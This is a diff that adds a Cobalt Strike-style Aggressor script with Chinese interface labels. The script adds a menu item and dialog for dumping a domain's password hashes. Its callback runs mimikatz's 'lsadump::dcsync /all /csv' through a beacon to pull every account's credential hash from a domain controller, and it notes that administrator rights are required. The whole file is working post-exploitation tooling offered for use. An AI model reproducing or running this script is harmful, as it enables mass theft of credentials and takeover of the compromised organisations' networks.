@@ -1,0 +1,20 @@
+    menu "域密码哈希值" {
+
+    item "导出域密码哈希值" {
+      dialog_show($dialog);
+      local('$bid');
+      foreach $bid ($1){
+        $beaconid = $1;
+            }
+      }
+
+sub callback {
+      $domain = $3["domain"];
+      bmimikatz($beaconid, "lsadump::dcsync /domain:$domain /all /csv");
+}
+
+        $dialog = dialog("域密码哈希值", %(domain => "domain"), &callback);
+        dialog_description($dialog, "使用条件:管理员权限"); #介绍
+        drow_text($dialog, "domain", "域名: "); #文本
+        dbutton_action($dialog, "开始"); #按钮
+}
